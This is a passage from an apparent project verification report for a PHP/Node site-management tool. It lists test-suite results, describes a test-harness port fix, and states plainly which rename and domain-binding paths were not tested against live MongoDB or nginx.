  change under test. Replaced with a random port in a wide range, `proc_open` (so the child handle is
  known), a retry when the bind is refused, and the shutdown after the last request. Suppressed
  `@unlink()` warnings were also removed: `set_error_handler` still receives them in PHP 8, and the
  suite asserts it produced no diagnostics at all.

### 12.5 Verification after this pass

| Check | Result |
|---|---|
| `php tests/run-tests.php` | **257 passed, 0 failed** (187 → 257; three consecutive runs, no flakes) |
| `node tests/test-backroom-escaping.js` | 31 checks (nonce present on every inline script, no `on*=` handlers, `esc`/`safeHref` behaviour, no `gaId`) |
| `node tests/test-admin-site-panel.js` | 45 checks — the shipped panel code executed against a stub DOM/fetch, incl. the client/server normalizer agreement table shared with PHP |
| `node tests/test-lambda.js` / `test-admin-regex.js` / `test-static-site.js` | 41 / 8 / 10 passed |
| `python3 tests/check-edge-contract.py` | 24 checks hold |
| `php -l` + `node --check` on every first-party file, `./tests/nginx-lint.sh` (3 configs) | clean |
| `./tests/run-all.sh` | `ALL CHECKS PASSED` |

Still unverified here, and stated as such in the runbook: there is no MongoDB or nginx in this
sandbox, so `move_site_record()` and `site_bind_domain()` are covered by structural assertions and by
the Node harness that stubs `fetch` — not against a live store or a live resolver. The first rename on
a real box should be followed by `mongosh … sites.find({})` and the `SITE renamed` log line.

Deliberately not built: no UI for deleting a site, no redirect from an old address (nothing remembers
that the old name was yours once the record moves), no DNS writes, and no owner-facing cache purge
beyond the existing `@@cache`.
